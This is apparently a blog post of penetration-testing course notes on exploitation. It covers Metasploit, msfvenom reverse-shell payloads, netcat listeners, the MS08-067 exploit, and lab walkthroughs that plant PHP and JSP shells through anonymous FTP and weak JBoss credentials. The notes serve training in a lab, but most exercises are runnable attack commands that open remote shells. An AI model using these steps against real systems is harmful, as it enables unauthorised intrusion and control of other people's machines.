---
layout: post
title: "CNO Day 2 Exploitation"
date: "2018-07-24 08:47:01"
comments: false
categories: "cybersec"
---

# Exploitation

> An exploit is some software which leverages a vunerability to perform an  action.

Important to differientiate the *payload* from the *exploit*.

> A payload is something executed via an exploit.


# Finding Exploits

* [Exploit DB](https://www.exploit-db.com)
* Google
* SearchSploit - a local mirror of exploit-db; useful for local cached copies.

For example *CVE-2008-4250*, maybe assigned different vendor specific labels. In this case *MSE08-067*, by searching Google and heading to the Microsoft security bullitin:

Using the metasploit search module:

    msfconsole
    msf > search MSE08-067



# Generating Payloads

Payloads can be used to execute any number of things, for example, a shell, meterpreter, adding users.

Payloads can be in many forms; assembly instructions (shellcode), Java, Python, PowerShell and so on.

Remember, payloads need to executed in the context of whatever programming runtime is being exploited. A Java program requires Java payloads, memory corruption shellcode, and so on.


## Bind and Reverse Shells

A **bind shells** listen on a port on the target host, and when connected provide a form of shell. The downside to bind shells, is firewall infrastructure. The upside is less outbound traffic generation, and potentially stealthier.

A **reverse shell** have the advantage of being more resilient against firewalls and NAT. Typically organisations are more permissive with outbound traffic, rather than inbound traffic.

Tip: If the target host is a mail server, try to use ports that legimately make sense to its function (e.g. if port 110, the POP3 port, is unused, bind shell it, to blend in to the feel of a mail server).


## Staged and Stageless Payloads

Payloads can execute in different ways.

A *staged* payload, executes an initial bootstrap piece of code whose job is to fetch, execute and hand over to a larger piece of code. Can generate more traffic making it easier to detect, easier for AV to detect. It dodes allow for smaller payloads.

A *stageless* payload is monolithic, in that everything is self contained. This does come at the cost of size.



# MSFVenom

`msfvenom -l` will list out payloads it can generate.

The `--help-formats` flag will let you see the different format payloads can be morphed into (e.g. vbs, aspx, psh, jar, etc).

Tip: Staged versions of exploits are signified with a `/`, stageless are signified with `_`, for example:

    windows/meterpreter/reverse_tcp
    windows/meterpreter_reverse_tcp



## Executable Formats

TODO:


## Catching Shells

TODO


## Transfer Methods





## Exercise Create Exploit with MSFVenom

Create a reverse TCP shell using msfvenom:

    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.99 LPORT=4444 -f exe -o malicious.exe

This will produce an unstaged reverse TCP shell, that expects to connect back to its host on port 4444. You could for example use netcat to intercept the reverse shell, on the host (not the target), spool up a listener:

    nc -nvlp 4444

Lets create the staged version (note the `/` vs `_`):

    msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.99 LPORT=4444 -f exe -o malicious.exe

Again, its a reverse shell, but this time its staged (i.e. just a bootstrap, which will expect to download the remain pieces of the exploit as smaller modules after its running). For this we will need to spool up the MSFCommand host to serve back these pieces (`netcat` is too simple to do this):

    msfconsole
    msf > use exploit/multi/handler
    msf > set payload windows/shell/reverse_tcp
    msf > options

The options will show you what parameters are needed for the exploit, for example, the staged windows reverse_tcp exploit needs two parameters, LHOST and LPORT, set these up and run the exploit:

    msf > set LPORT 4444
    msf > set LHOST 192.168.0.99

    msf > run
    [*] Exploit running as background job 0.
    [*] Started reverse TCP handler on 192.168.0.99:4444

Using msfconsole as the host has many advantages. For example, a meterpreter session over a Windows command shell, multiple shell sessions.

To dump out running shell session  on the Kali host:

    msf > sessions
    1   shell  x86/windows          192.168.0.99:4444 -> 192.168.0.23


    nmap --script vuln 192.168.0.14

This will highlight CVE issues.

    msfconsole
    use exploit/windows/smb/ms08_067_netapi
    options

Needs 3 params; RHOST, RPORT and SMBPIPE.

    set RHOST 192.168.0.14
    set payload windows/shell/reverse_tcp
    options
    exploit




# Exercise Windows Host with Anon FTP and IIS

So we have a Windows 2012 R2 host that has anonymous FTP, IIS and SQL Server running.

Do a basic shakedown:

    nmap -A -sV 192.168.0.62
    nmap --script vuln 192.168.0.62

Hmm FTP. Try to connect to the FTP server:

    ftp 192.168.0.62

Connect with the anonymous account. Looks like we have `put` access. Lets figure out if the IIS server is running an interpreted runtime such as ASP or PHP, by crafting some basic pages for these languages, and putting them on the server. See if they run. Looks like PHP is the go. MSFVenom a PHP payload:

    msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.0.99 LPORT=4444 -f raw -o bad.php

FTP `bad.php` onto the target. Spin up a listener that the PHP reverse shell will connect to:

    msfconsole
    use exploit/multi/handler
    set payload php/meterpreter_reverse_tcp
    options
    set LHOST 192.168.0.99

Now visit `bad.php` on the target server using a web browser. You should get a shell.

The MSFConsole listener session, will show a new active sessions:

    msf> sessions

To connect to a specific session:

    msf> sessions 3



## JBoss Server Exercise

Next up a Linux box, running JBoss with weak credentials. Try some basic combos admin/admin, admin/password, you might get lucky. If so, churn out an exploit and payload using msfvenom, a JSP packaged into a `WAR` (a Java web application archive) file would be good, which venom supports.

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.99 LPORT=4444 -f war -o rshell.war

Deploy it through the admin console. Make sure its enabled. Finally make sure you have a listener running, which the reverse shell will attempt to connect, in this case keep it simple with netcat:

    nc -nvlp 4444

Finally, hit the remote shell exploit by visiting [http://192.168.0.63:8080/rshell](#) in a browser, which will attempt to call home (netcat). Boom, remote shell.


# Practical Assessment

* Will need to relay to get through
* Kali > Mail > DC
* Required to bulid a scenario, by establishing a number of VM's (e.g. an enterprise network)
* The more complex, and more CNO techniques it demonstrates, the better.
* Andrew will provide access to some base builds (e.g. kernel priv esc issues, old OS)
* Checkout vulnhub for machines with 


# Resources

* [Offensive Security's Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
* [hackthebox.eu](https://www.hackthebox.eu/)
* [MITRE's ATT&CK Matrix](https://attack.mitre.org/wiki/Main_Page)


